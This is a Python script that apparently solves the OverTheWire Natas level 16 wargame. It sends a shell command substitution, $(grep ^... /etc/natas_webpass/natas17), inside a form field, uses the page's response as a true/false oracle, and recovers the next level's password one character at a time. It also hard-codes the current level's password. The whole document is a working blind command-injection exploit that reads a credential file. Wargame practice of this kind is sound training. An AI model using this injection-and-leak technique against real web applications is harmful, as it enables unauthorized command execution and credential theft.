#!/usr/bin/python
import requests
from string import *

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
url = f'http://{username}.natas.labs.overthewire.org/'

characters = ascii_letters + digits 
leakedpassword = ""
while True:
    found = False
    for ch in characters:
        sql = f"anythings$(grep ^{leakedpassword}{ch} /etc/natas_webpass/natas17)"
        response = requests.post(url ,data = {"needle" : sql} ,auth=(username, password))
        if "anythings" not in response.text:
            leakedpassword += ch
            print(leakedpassword)
            found = True
            break
            
    if not found:
        break

